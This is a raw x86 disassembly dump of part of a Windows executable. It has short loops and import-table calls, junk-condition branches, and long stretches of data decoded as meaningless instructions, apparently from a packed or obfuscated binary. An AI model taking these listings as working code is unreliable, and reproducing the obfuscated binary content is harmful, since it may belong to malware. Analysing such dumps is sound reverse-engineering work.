  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x4335af,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x4335af
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x4335af,edi
  409bf8:	mov    edi,DWORD PTR ds:0x4335af
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x4335af,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x4335a3,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x4335a3
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x4335a3,edi
  409c26:	cmp    DWORD PTR ds:0x4335a3,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x4335a3,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x43375d
  409c45:	push   0x433767
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   ebx,eax,0x6517deb3
  409c81:	out    dx,al
  409c82:	jl     0x409d00
  409c84:	retf   0x7c79
  409c87:	jl     0x409ca1
  409c89:	mov    al,0x58
  409c8b:	jl     0x409c6d
  409c8d:	sahf   
  409c8e:	adc    ecx,0x79
  409c91:	shr    edi,1
  409c93:	cwde   
  409c94:	lods   eax,DWORD PTR ds:[esi]
  409c95:	fsub   st(3),st
  409c97:	dec    eax
  409c98:	repz xchg ecx,eax
  409c9a:	push   0x68
  409c9c:	dec    edx
  409c9d:	cli    
  409c9e:	cdq    
  409c9f:	dec    esi
  409ca0:	arpl   WORD PTR [edx-0x22],di
  409ca3:	or     bh,ch
  409ca5:	nop
  409ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca7:	fisttp WORD PTR [eax+0x41]
  409caa:	inc    eax
  409cab:	push   ebp
  409cac:	fwait
  409cad:	sbb    esi,DWORD PTR [edi-0x456086ea]
  409cb3:	add    DWORD PTR [eax-0x7a],0x6a
  409cb7:	xlat   BYTE PTR ds:[ebx]
  409cb8:	mov    edi,0x94ab949b
  409cbd:	xchg   esi,eax
  409cbe:	push   ecx
  409cbf:	lock sub DWORD PTR [ebx+0x3ad7051d],ebp
  409cc6:	jge    0x409cbd
  409cc8:	mov    al,ds:0x6bca2eca
  409ccd:	and    al,0x50
  409ccf:	int3   
  409cd0:	jmp    0x409c75
  409cd2:	push   edi
  409cd3:	jae    0x409d3e
  409cd5:	add    DWORD PTR [eax+ebp*8-0x54bb80cf],esp
  409cdc:	xor    esi,DWORD PTR [edx+0x5b08b25f]
  409ce2:	push   cs
  409ce3:	icebp  
  409ce4:	inc    ecx
  409ce5:	enter  0x41c5,0x2a
  409ce9:	adc    al,ch
  409ceb:	(bad)  
  409cec:	xchg   edi,eax
  409ced:	adc    al,0x6e
  409cef:	hlt    
  409cf0:	in     eax,0xf4
  409cf2:	inc    esi
  409cf3:	stc    
  409cf4:	add    ch,BYTE PTR [ebx-0x2c43c938]
  409cfa:	xchg   esp,eax
  409cfb:	shl    DWORD PTR gs:[edx-0x44],1
  409cff:	push   ds
  409d00:	push   es
  409d01:	retf   0x39a7
  409d04:	or     esi,DWORD PTR [esi]
  409d06:	mov    WORD PTR ds:0x5576a976,?
  409d0c:	mov    ds:0xd050530b,eax
  409d11:	sbb    DWORD PTR [ebx],ebx
  409d13:	push   ds
  409d14:	mov    dl,ch
  409d16:	das    
  409d17:	mov    ecx,0x606a8907
  409d1c:	int3   
  409d1d:	cmp    ebp,eax
  409d1f:	sub    eax,0xdc10d062
  409d24:	sub    al,0xed
  409d26:	or     esi,DWORD PTR [ecx+0x3d5994c]
  409d2c:	cmp    esi,DWORD PTR [ebx+0x7407c0e1]
  409d32:	mov    esi,0x76f71c68
  409d37:	cmp    al,0x2c
  409d39:	pusha  
  409d3a:	loopne 0x409d89
  409d3c:	push   edx
  409d3d:	jg     0x409d37
  409d3f:	jnp    0x409d7f
  409d41:	stos   BYTE PTR es:[edi],al
  409d42:	pop    WORD PTR [edi+esi*1]
  409d46:	add    DWORD PTR [eax+0x9ffddde],ebx
  409d4c:	jno    0x409d4e
  409d4e:	ret    0xa5c8
  409d51:	ins    DWORD PTR es:[edi],dx
  409d52:	adc    eax,0xbb43b1d6
  409d57:	push   ecx
  409d58:	xlat   BYTE PTR ds:[ebx]
  409d59:	hlt    
  409d5a:	retf   0xc3aa
  409d5d:	std    
  409d5e:	ss in  al,0x51
  409d61:	cmc    
  409d62:	push   edi
  409d63:	neg    bh
  409d65:	fdivr  QWORD PTR [esi-0x36ae5df6]
  409d6b:	xor    DWORD PTR [ebp-0x2ba76fe3],ecx
  409d71:	retf   0xec91
  409d74:	add    BYTE PTR [ecx],0xc8
  409d77:	(bad)  
  409d78:	clc    
  409d79:	leave  
  409d7a:	push   es
  409d7b:	jno    0x409d8a
  409d7d:	adc    dh,BYTE PTR [edx]
  409d7f:	out    0x20,eax
  409d81:	addr16 popf 
  409d83:	loope  0x409d50
  409d85:	rep lods al,BYTE PTR ds:[esi]
  409d87:	inc    ebp
  409d88:	mov    bl,0x82
  409d8a:	dec    esi
  409d8b:	mov    esi,0x157948d0
  409d90:	lock dec edx
  409d92:	fist   WORD PTR ds:0x4c050bd6
  409d98:	mov    al,ds:0x57259c39
  409d9d:	add    al,0xc9
  409d9f:	mov    ebx,0x6b5161b5
  409da4:	jmp    FWORD PTR [edx]
  409da6:	pop    edx
  409da7:	stc    
  409da8:	mov    dl,0xf8
  409daa:	push   es
  409dab:	mov    bl,0x46
  409dad:	arpl   di,si
  409daf:	sub    DWORD PTR [esi-0x1c],esi
  409db2:	cmp    DWORD PTR [eax],edi
  409db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409db5:	sbb    ebp,DWORD PTR [ecx+0x639896d9]
  409dbb:	(bad)  
  409dbc:	ins    DWORD PTR es:[edi],dx
  409dbd:	cs cld 
  409dbf:	mov    cl,0x7e
  409dc1:	cmp    eax,0xfa6954c2
  409dc6:	psrlq  mm7,QWORD PTR [ebp-0x5e]
  409dca:	mov    dl,0x6f
  409dcc:	xor    DWORD PTR [eax+eax*4-0x3f95f374],edi
  409dd3:	mov    DWORD PTR [eax+0x17],ebx
  409dd6:	jl     0x409d78
  409dd8:	mov    ch,0xb7
  409dda:	sub    ebx,DWORD PTR [edi-0x263b4796]
  409de0:	mov    ebx,0xdff3e800
  409de5:	outs   dx,BYTE PTR ds:[esi]
  409de6:	ds in  al,dx
  409de8:	into   
  409de9:	push   esi
  409dea:	and    eax,0xd93ee4a2
  409def:	xchg   esi,eax
  409df0:	loope  0x409e1c
  409df2:	cmp    edx,DWORD PTR [eax*8-0x32038b76]
  409df9:	jns    0x409db7
  409dfb:	lea    eax,[edi]
  409dfd:	push   ebp
  409dfe:	pop    ecx
  409dff:	or     BYTE PTR [esi],bl
  409e01:	mov    al,ds:0xb92fa8cd
  409e06:	xchg   ebp,eax
  409e07:	pop    ds
  409e08:	xchg   ecx,eax
  409e09:	jbe    0x409da2
  409e0b:	daa    
  409e0c:	mov    ds:0xe51bd735,al
  409e11:	push   0xffffffc6
  409e13:	pop    eax
  409e14:	es and al,0xd
  409e17:	pop    edx
  409e18:	jae    0x409daa
  409e1a:	lods   eax,DWORD PTR ds:[esi]
  409e1b:	xchg   esp,eax
  409e1c:	xchg   ebx,eax
  409e1d:	push   esi
  409e1e:	push   es
  409e1f:	jl     0x409e49
  409e21:	push   ebx
  409e22:	lods   eax,DWORD PTR ds:[esi]
  409e23:	das    
  409e24:	(bad)  
  409e25:	cmp    eax,0xf13a2728
  409e2a:	inc    ebp
  409e2b:	xlat   BYTE PTR ds:[ebx]
  409e2c:	jne    0x409e9b
  409e2e:	sub    edi,edx
  409e30:	inc    esp
  409e31:	pop    ecx
  409e32:	test   al,0x27
  409e34:	loopne 0x409de4
  409e36:	icebp  
  409e37:	in     al,dx
  409e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e39:	cld    
  409e3a:	add    ecx,0x584379a9
  409e40:	add    DWORD PTR [edi-0x13],edi
  409e43:	pop    esi
  409e44:	loopne 0x409e58
  409e46:	mov    ah,0x3a
  409e48:	je     0x409e88
  409e4a:	add    al,0x55
  409e4c:	(bad)  
  409e4d:	mov    bl,0xf0
  409e4f:	jmp    0x7da183
  409e54:	sar    DWORD PTR [edi],cl
  409e56:	daa    
  409e57:	std    
  409e58:	std    
  409e59:	mov    eax,0x943727df
  409e5e:	push   es
  409e5f:	aas    
  409e60:	inc    edx
  409e61:	stos   BYTE PTR es:[edi],al
  409e62:	dec    ebx
  409e63:	adc    al,0x86
  409e65:	cmp    DWORD PTR [edx-0x2],0xfc8c4a4b
  409e6c:	and    edx,ebx
  409e6e:	xchg   edx,eax
  409e6f:	dec    ebp
  409e70:	repnz sbb DWORD PTR [esi+edx*2-0x49709929],ebp
  409e78:	and    ch,BYTE PTR [ebx+0x64f93305]
  409e7e:	fnstsw ax
  409e80:	cli    
  409e81:	aaa    
  409e82:	jg     0x409ea1
  409e84:	stos   DWORD PTR es:[edi],eax
  409e85:	sub    ebx,DWORD PTR [esp+ebx*8+0x3041e53e]
  409e8c:	shr    BYTE PTR [esi-0x5c8d1362],0xa1
  409e93:	dec    eax
  409e94:	out    0xb0,eax
  409e96:	pushf  
  409e97:	pop    eax
  409e98:	cmp    esi,DWORD PTR [edi+edi*8-0x32]
  409e9c:	retf   0x9b76
  409e9f:	mov    al,ds:0xe66a8544
  409ea4:	pop    ebp
  409ea5:	pop    edi
  409ea6:	push   esi
  409ea7:	inc    esi
  409ea8:	push   edx
  409ea9:	call   0xc708:0x360b423e
  409eb0:	loope  0x409ecc
  409eb2:	adc    DWORD PTR [eax+0x3386d4b],eax
  409eb8:	jo     0x409f04
  409eba:	cs js  0x409f18
  409ebd:	mov    dl,0x6
  409ebf:	ss clc 
  409ec1:	and    eax,0xdf7840d6
  409ec6:	jl     0x409ed4
  409ec8:	loope  0x409e80
  409eca:	mov    ecx,0xdf78dce6
  409ecf:	(bad)  
  409ed0:	xor    BYTE PTR [esi-0x67],0xca
  409ed4:	ret    
  409ed5:	jp     0x409e87
  409ed7:	pop    esp
  409ed8:	mov    dl,bl
  409eda:	into   
  409edb:	clc    
  409edc:	dec    ecx
  409edd:	sbb    DWORD PTR [ecx+0x2a196790],esp
  409ee3:	rol    DWORD PTR [ecx+0x4e],1
  409ee6:	dec    ebp
  409ee7:	loope  0x409e76
  409ee9:	loopne 0x409f22
  409eeb:	rol    dh,cl
  409eed:	jb     0x409f2e
  409eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ef0:	mov    bl,0x3d
  409ef2:	push   esp
  409ef3:	fld    TBYTE PTR [ebp-0x16b3c38a]
  409ef9:	data16 ss jb 0x409ee9
  409efd:	call   0xb8f6:0x3692ce97
  409f04:	outs   dx,DWORD PTR ds:[esi]
  409f05:	xor    BYTE PTR ds:0x4981a14b,bl
  409f0b:	mov    BYTE PTR [edx+0x70cf8728],cl
  409f11:	outs   dx,BYTE PTR ds:[esi]
  409f12:	mov    ds:0x8a32f6d9,eax
  409f17:	pop    ds
  409f18:	pop    es
  409f19:	int3   
  409f1a:	les    eax,FWORD PTR [ebp+0x15734272]
  409f20:	daa    
  409f21:	mov    ds:0xd95af8c0,eax
  409f26:	xchg   eax,edx
  409f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f2a:	xchg   ecx,eax
  409f2b:	loop   0x409f38
  409f2d:	adc    eax,0xe8aa3e66
  409f32:	adc    ch,al
  409f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f36:	xor    esp,DWORD PTR [edi-0x449df7f7]
  409f3c:	push   ds
  409f3d:	aaa    
  409f3e:	push   ebp
  409f3f:	mov    ds:0x7159c334,eax
  409f44:	push   ebx
  409f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f46:	das    
  409f47:	fisubr WORD PTR [ebx+0x655f5d93]
  409f4d:	xchg   ebx,eax
  409f4e:	arpl   WORD PTR [esi+esi*2],dx
  409f51:	mov    ds:0x5f75fc2b,al
  409f56:	cli    
  409f57:	sar    DWORD PTR [edi-0x74b620f4],0xf7
  409f5e:	xchg   ebx,eax
  409f5f:	xchg   ebx,eax
  409f60:	fs cwde 
  409f62:	fidiv  DWORD PTR [edx+esi*2+0x35]
  409f66:	jno    0x409fa1
  409f68:	mov    eax,0x59b305ac
  409f6d:	cwde   
  409f6e:	(bad)  
  409f6f:	xchg   esi,eax
  409f70:	(bad)  
  409f71:	xchg   edx,eax
  409f72:	sbb    al,0xa0
  409f74:	inc    esi
  409f75:	pop    ebx
  409f76:	adc    eax,0x7bd677d3
  409f7b:	fimul  WORD PTR [esi+eax*1-0x266340b9]
  409f82:	mov    bl,0x10
  409f84:	jnp    0x409f30
  409f86:	test   BYTE PTR [ebx+0x52],bl
  409f89:	push   ss
  409f8a:	pusha  
  409f8b:	mov    dl,0xe9
  409f8d:	scas   al,BYTE PTR es:[edi]
  409f8e:	scas   al,BYTE PTR es:[edi]
  409f8f:	je     0x409fe3
  409f91:	sub    al,0x1
  409f93:	test   BYTE PTR [eax-0x60b99f4e],al
  409f99:	stos   BYTE PTR es:[edi],al
  409f9a:	adc    ecx,DWORD PTR [edi-0x9ba6239]
  409fa0:	fs shl edx,0xc1
  409fa4:	lahf   
  409fa5:	push   ecx
  409fa6:	dec    edx
  409fa7:	nop
  409fa8:	and    cl,BYTE PTR [esi+0x617c420d]
  409fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409faf:	(bad)  
  409fb0:	jb     0x40a008
  409fb2:	inc    ebx
  409fb3:	lods   al,BYTE PTR ds:[esi]
  409fb4:	(bad)  
  409fb5:	add    dl,0x38
  409fb8:	or     al,0xc
  409fba:	and    BYTE PTR [ebx+0x70],bh
  409fbd:	(bad)  
  409fbe:	lods   eax,DWORD PTR ds:[esi]
  409fbf:	jp     0x409f99
  409fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fc2:	nop
  409fc3:	(bad)  
  409fc4:	mov    esi,0x65c432d9
  409fc9:	add    BYTE PTR [ebp+0x33b5dba6],ch
  409fcf:	test   al,0x23
  409fd1:	ror    dh,cl
  409fd3:	mov    edx,0x97264a6f
  409fd8:	mov    dl,0xe6
  409fda:	and    ebp,DWORD PTR ds:0x45c76d57
  409fe0:	int3   
  409fe1:	cmp    BYTE PTR [ebp+0x2581f89c],al
  409fe7:	and    esi,DWORD PTR [esi]
  409fe9:	inc    ebx
  409fea:	add    BYTE PTR [eax],al
  409fec:	add    BYTE PTR [eax],al
  409fee:	add    cl,ch
  409ff0:	or     eax,0x8b000000
  409ff5:	adc    eax,0x433623
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x433623,edx
  40a001:	cmp    DWORD PTR ds:0x433623,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x433623,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x433673
  40a040:	adc    edx,DWORD PTR ds:0x43362b
  40a046:	mov    DWORD PTR ds:0x433673,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x433557,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x4335df
  40a075:	xor    DWORD PTR ds:0x4335b3,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x433553,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x43366b
  40a094:	xor    DWORD PTR ds:0x43365b,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	mov    al,0x41
  40a0ad:	loopne 0x40a09f
  40a0af:	xor    ebp,edx
  40a0b1:	jl     0x40a12f
  40a0b3:	retf   0x7c79
  40a0b6:	jl     0x40a03c
  40a0b8:	mov    bh,0x15
  40a0ba:	fist   DWORD PTR [ebx]
  40a0bc:	out    dx,al
  40a0bd:	dec    edi
  40a0be:	pop    edi
  40a0bf:	(bad)  
  40a0c0:	ins    BYTE PTR es:[edi],dx
  40a0c1:	out    0x13,al
  40a0c3:	add    BYTE PTR ds:0x74514ff8,bl
  40a0c9:	add    edi,DWORD PTR [ecx-0x702b6e7f]
  40a0cf:	inc    ebx
  40a0d0:	(bad)  
  40a0d1:	mov    al,ds:0x3e250de5
  40a0d6:	sbb    esp,DWORD PTR [edi+esi*2+0x71]
  40a0da:	imul   edi,DWORD PTR [ebp+esi*1+0x12],0x11
  40a0df:	sub    eax,0xee50336f
  40a0e4:	cmc    
  40a0e5:	jg     0x40a0a0
  40a0e7:	xor    BYTE PTR [edx],ah
  40a0e9:	jne    0x40a0c7
  40a0eb:	ret    
  40a0ec:	pop    edi
  40a0ed:	and    al,0x2c
  40a0ef:	dec    esp
  40a0f0:	aaa    
  40a0f1:	inc    edx
  40a0f2:	add    DWORD PTR [ecx+0x75],0xc2840aab
  40a0f9:	push   cs
  40a0fa:	neg    BYTE PTR [ebp-0x133a583b]
  40a100:	scas   al,BYTE PTR es:[edi]
  40a101:	and    BYTE PTR [ebp+0xb2564e1],0x31
  40a108:	daa    
  40a109:	fcomp  DWORD PTR [edi+0x7c]
  40a10c:	cwde   
  40a10d:	fcomp  QWORD PTR [ebx-0x3662f62a]
  40a113:	ret    
  40a114:	push   eax
  40a115:	js     0x40a0e3
  40a117:	jge    0x40a13a
  40a119:	lods   eax,DWORD PTR ds:[esi]
  40a11a:	lds    eax,FWORD PTR [edi]
  40a11c:	mov    eax,0x5613864e
  40a121:	addr16 inc edx
  40a123:	xlat   BYTE PTR ds:[ebx]
  40a124:	pop    edx
  40a125:	or     esp,DWORD PTR [ecx-0x3a]
  40a128:	shr    BYTE PTR [esi],cl
  40a12a:	in     eax,dx
  40a12b:	xchg   ebx,eax
  40a12c:	sar    BYTE PTR [ebx-0x65],1
  40a12f:	shl    DWORD PTR [ebx-0x5],cl
  40a132:	data16 mov dl,0xd5
  40a135:	push   ds
  40a136:	and    al,0xc9
  40a138:	mov    al,ds:0xc02a1701
  40a13d:	inc    esi
  40a13e:	outs   dx,BYTE PTR ds:[esi]
  40a13f:	outs   dx,DWORD PTR ds:[esi]
  40a140:	in     al,0x21
  40a142:	mov    al,0x4
  40a144:	les    eax,FWORD PTR [ecx+ebx*8-0x31]
  40a148:	ja     0x40a0e0
  40a14a:	sub    BYTE PTR [ecx],0x57
  40a14d:	ret    0xf16a
  40a150:	xor    eax,0xafaa2f3f
  40a155:	mov    ebx,0xfaec9f09
  40a15a:	jl     0x40a147
  40a15c:	stos   DWORD PTR es:[edi],eax
  40a15d:	xor    dh,BYTE PTR [eax-0x19b3883]
  40a163:	loop   0x40a0f9
  40a165:	push   ds
  40a166:	mov    edx,0xece9ee77
  40a16b:	fs inc esp
  40a16d:	mov    bh,0x20
  40a16f:	sbb    BYTE PTR [esi+0x16cdf49],ah
  40a175:	sbb    eax,0xad1c1018
  40a17a:	jmp    0x40a18c
  40a17c:	and    bh,al
  40a17e:	dec    ebp
  40a17f:	adc    BYTE PTR [esp+edx*8+0x6a340c83],dl
  40a186:	dec    ebx
  40a187:	xor    ecx,edi
  40a189:	rcl    eax,cl
  40a18b:	ret    
  40a18c:	or     BYTE PTR [edi],0xd9
  40a18f:	ret    
  40a190:	mov    ds:0x30465fb7,al
  40a195:	xor    DWORD PTR [ecx+eax*2+0x24],0x2a
  40a19a:	dec    edx
  40a19b:	pop    eax
  40a19c:	cmp    DWORD PTR [ebp+0x5],edx
  40a19f:	jle    0x40a21d
  40a1a1:	push   edi
  40a1a2:	aam    0x7b
  40a1a4:	jae    0x40a14d
  40a1a6:	xacquire xchg BYTE PTR [esi],bh
  40a1a9:	sub    DWORD PTR [edx-0x34],0x843de989
  40a1b0:	or     BYTE PTR cs:[esi+eiz*4-0xb80415d],bh
  40a1b8:	xor    eax,0x53865b3f
  40a1bd:	ret    
  40a1be:	and    BYTE PTR [edx-0x27],cl
  40a1c1:	mov    dh,0x92
  40a1c3:	jl     0x40a14c
  40a1c5:	or     dh,BYTE PTR [edx-0x30]
  40a1c8:	inc    edx
  40a1c9:	rcr    BYTE PTR [edi+0x48],cl
  40a1cc:	push   ds
  40a1cd:	mov    WORD PTR [ecx-0x5733ac44],gs
  40a1d3:	fwait
  40a1d4:	dec    edi
  40a1d5:	dec    eax
  40a1d6:	lods   al,BYTE PTR ds:[esi]
  40a1d7:	cmc    
  40a1d8:	lock xor eax,0xd33a09f5
  40a1de:	inc    esi
  40a1df:	call   0xf22d:0x1e83e2da
  40a1e6:	mov    ecx,0xaa89a5b4
  40a1eb:	mov    esp,0xf0a71f53
  40a1f0:	repz push 0xffffffa2
  40a1f3:	aas    
  40a1f4:	cmp    ch,BYTE PTR [ebx]
  40a1f6:	(bad)  
  40a1f7:	mov    ds:0x4c298346,eax
  40a1fc:	adc    esp,0x56
  40a1ff:	or     DWORD PTR [edx+0x36],ebp
  40a202:	mov    ecx,0x6220566f
  40a207:	and    cl,ch
  40a209:	adc    esp,DWORD PTR [edi+0x7]
  40a20c:	int    0xcf
  40a20e:	data16 or bh,BYTE PTR [ecx]
  40a211:	enter  0x838,0xad
  40a215:	push   ebp
  40a216:	push   ebp
  40a217:	stos   DWORD PTR es:[edi],eax
  40a218:	mov    ds:0xa5892153,eax
  40a21d:	sbb    ebx,ebx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	fadd   st(5),st
  40a223:	pop    ecx
  40a224:	repz bnd jbe 0x40a255
  40a228:	arpl   dx,bx
  40a22a:	push   ebx
  40a22b:	xchg   edx,eax
  40a22c:	test   al,0x48
  40a22e:	ret    
  40a22f:	fistp  DWORD PTR ds:0xd1ebc0d6
  40a235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a236:	mov    eax,cs
  40a238:	cmp    esi,edi
  40a23a:	gs inc eax
  40a23c:	test   eax,0x6a2e2322
  40a241:	mov    eax,0xca99b643
  40a246:	sub    DWORD PTR [edx],ecx
  40a248:	dec    edx
  40a249:	pop    ebp
  40a24a:	dec    esp
  40a24b:	(bad)  
  40a24c:	or     cl,0x20
  40a24f:	sti    
  40a250:	and    dh,al
  40a252:	inc    ebp
  40a253:	popa   
  40a254:	sbb    eax,0xb566dfb7
  40a259:	(bad)  
  40a25a:	shl    DWORD PTR [ebx-0x1a],1
  40a25d:	sar    DWORD PTR ds:0x3f281bfd,cl
  40a263:	imul   eax,DWORD PTR [ebp+0x62],0x5
  40a267:	sub    al,0x10
  40a269:	xchg   edi,eax
  40a26a:	out    dx,al
  40a26b:	into   
  40a26c:	push   0xf16d3c1d
  40a271:	dec    edx
  40a272:	mov    esi,0xed66ee90
  40a277:	nop
  40a278:	mov    ebx,0x35e0fa38
  40a27d:	retf   0x893f
  40a280:	pop    esi
  40a281:	add    eax,0x7ef369b2
  40a286:	pop    ebp
  40a287:	retf   
  40a288:	shl    DWORD PTR [edi-0x3393e73f],0x62
  40a28f:	in     eax,0x6b
  40a291:	std    
  40a292:	add    edx,eax
  40a294:	cmp    esi,DWORD PTR [ebp-0x22b02fb9]
  40a29a:	femms  
  40a29c:	shl    BYTE PTR [edx+0x7f],cl
  40a29f:	pop    esp
  40a2a0:	sub    DWORD PTR [ecx],edi
  40a2a2:	mov    edi,0x4a609aa4
  40a2a7:	push   edi
  40a2a8:	push   0x9d158fbf
  40a2ad:	loop   0x40a2a7
  40a2af:	and    edx,DWORD PTR [edx-0x30]
  40a2b2:	sbb    al,0x85
  40a2b4:	cs jmp 0x40a305
  40a2b7:	out    dx,eax
  40a2b8:	lock dec esp
  40a2ba:	cli    
  40a2bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2bc:	mov    edi,0xb486400e
  40a2c1:	(bad)  
  40a2c2:	call   FWORD PTR [ebx+0x2c]
  40a2c5:	pop    es
  40a2c6:	jmp    0x40a2c8
  40a2c8:	lods   al,BYTE PTR ds:[esi]
  40a2c9:	fwait
  40a2ca:	pop    ebp
  40a2cb:	in     eax,0x87
  40a2cd:	pop    ecx
  40a2ce:	loope  0x40a2ed
  40a2d0:	sub    cl,BYTE PTR [ecx-0x19]
  40a2d3:	jns    0x40a312
  40a2d5:	aas    
  40a2d6:	dec    edx
  40a2d7:	fcomi  st,st(4)
  40a2d9:	jp     0x40a32c
  40a2db:	ds mov al,0x83
  40a2de:	pop    ecx
  40a2df:	imul   edx,DWORD PTR [eax+0x19],0xafef5ffd
  40a2e6:	fild   DWORD PTR [esi+0x29]
  40a2e9:	sbb    cl,al
  40a2eb:	sub    BYTE PTR [esi-0x42],dh
  40a2ee:	int    0xd6
  40a2f0:	in     al,0x3a
  40a2f2:	mov    ds:0xe46b76da,eax
  40a2f7:	jle    0x40a2e9
  40a2f9:	sub    esi,DWORD PTR [esi-0x77]
  40a2fc:	aas    
  40a2fd:	adc    BYTE PTR [ebp*2+0x60337324],ah
  40a304:	les    edx,FWORD PTR [eax+0x4e891370]
  40a30a:	rol    edi,1
  40a30c:	scas   al,BYTE PTR es:[edi]
  40a30d:	out    0x4b,al
  40a30f:	fistp  DWORD PTR [edx-0x65c9f0d9]
  40a315:	shl    eax,0x18
  40a318:	jmp    0x7721820b
  40a31d:	lds    esi,FWORD PTR [ebp-0x5b25a0c8]
  40a323:	inc    edi
  40a324:	out    dx,al
  40a325:	mov    WORD PTR ss:[edi+0x66db5f55],gs
  40a32c:	adc    ch,dl
  40a32e:	test   DWORD PTR [ebx+0x2d788d55],ebx
  40a334:	add    eax,0xc6ae4272
  40a339:	fnstenv [edi+0x1ac33654]
  40a33f:	sahf   
  40a340:	adc    BYTE PTR [esi-0x315fe32],dl
  40a346:	xor    ah,BYTE PTR [ecx]
  40a348:	in     al,dx
  40a349:	mov    bl,0xd1
  40a34b:	nop
  40a34c:	sti    
  40a34d:	out    dx,eax
  40a34e:	imul   ecx,esp,0xc334e2d0
  40a354:	xchg   esi,eax
  40a355:	xor    al,0x85
  40a357:	and    edx,DWORD PTR [edi]
  40a359:	push   0xd8ea521c
  40a35e:	inc    esi
  40a35f:	adc    BYTE PTR [esi+0x3b],0x1f
  40a363:	jge    0x40a39d
  40a365:	inc    eax
  40a366:	or     BYTE PTR [ecx],dh
  40a368:	dec    edx
  40a369:	xchg   edi,eax
  40a36a:	push   0x8b089b95
  40a36f:	lods   eax,DWORD PTR ds:[esi]
  40a370:	in     eax,0xb2
  40a372:	push   0xccf96979
  40a377:	in     eax,dx
  40a378:	test   BYTE PTR [ebx+edx*8-0x58100001],bh
  40a37f:	sti    
  40a380:	add    al,bh
  40a382:	adc    al,0x40
  40a384:	fiadd  WORD PTR [edx+0x717a2c6]
  40a38a:	sub    BYTE PTR [edi-0x73],0xf9
  40a38e:	xchg   DWORD PTR [esi+0x5c835ef8],ebp
  40a394:	cwde   
  40a395:	repz mov ecx,DWORD PTR [ecx+0x4f]
  40a399:	mul    BYTE PTR [ecx-0x5c]
  40a39c:	outs   dx,BYTE PTR ds:[esi]
  40a39d:	pop    ss
  40a39e:	fisub  WORD PTR [eax+0x63fd4f9f]
  40a3a4:	jl     0x40a378
  40a3a6:	inc    edi
  40a3a7:	loop   0x40a3fe
  40a3a9:	or     DWORD PTR [esi-0x25],esi
  40a3ac:	fisttp DWORD PTR [ebx]
  40a3ae:	icebp  
  40a3af:	aaa    
  40a3b0:	shl    BYTE PTR [edi+0x48],0x2
  40a3b4:	inc    edx
  40a3b5:	sahf   
  40a3b6:	add    eax,0x977288a
  40a3bb:	bound  ecx,QWORD PTR [ebx+0x4a43211f]
  40a3c1:	xchg   ebp,eax
  40a3c2:	mov    edx,0x9560b3f
  40a3c7:	aad    0x52
  40a3c9:	call   0x5917:0x93f18da3
  40a3d0:	jle    0x40a3d1
  40a3d2:	popf   
  40a3d3:	add    esp,DWORD PTR [edi-0x74]
  40a3d6:	(bad)  
  40a3d7:	dec    esi
  40a3d8:	dec    ebp
  40a3d9:	out    dx,al
  40a3da:	xor    ecx,DWORD PTR [eax+0x11]
  40a3dd:	xlat   BYTE PTR fs:[ebx]
  40a3df:	jp     0x40a399
  40a3e1:	xlat   BYTE PTR ds:[ebx]
